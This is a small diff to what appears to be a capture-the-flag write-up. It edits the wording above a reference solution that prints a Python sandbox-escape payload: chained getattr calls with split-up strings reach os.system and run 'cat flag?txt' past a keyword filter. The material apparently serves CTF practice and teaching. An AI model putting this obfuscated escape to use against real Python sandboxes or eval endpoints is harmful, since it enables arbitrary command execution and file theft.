@@ -124,7 +124,7 @@ else:
 <details>
 <summary>Reference Solution</summary>
 
-it is not over until you remove getattr
+It is not over until you remove `getattr`:
 
 <code>getattr(getattr(getattr(globals(), 'get')('__bu' + 'iltins__'), '__imp' + 'ort__')('o' + 's'), 'sys' + 'tem')('cat flag?txt')</code>
 </details>
